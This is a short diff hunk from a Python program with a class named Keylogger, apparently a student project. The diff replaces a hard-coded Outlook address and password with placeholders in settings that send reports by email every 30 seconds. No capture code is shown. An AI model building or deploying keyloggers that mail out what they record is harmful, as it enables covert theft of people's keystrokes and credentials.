@@ -18,8 +18,8 @@ from email.mime.text import MIMEText
 
 #PARAMATERS
 INTERVAL = 30 # in seconds, 60 means 1 minute and so on
-EMAIL_ADDRESS = "SomethingAwesome6441@outlook.com"
-EMAIL_PASSWORD = "ThisIsAStrongPassword"
+EMAIL_ADDRESS = "<INSERT EMAIL HERE>"
+EMAIL_PASSWORD = "<INSERT PASSWORD HERE>"
 
 class Keylogger:
     def __init__(self, interval, report_method="email"):
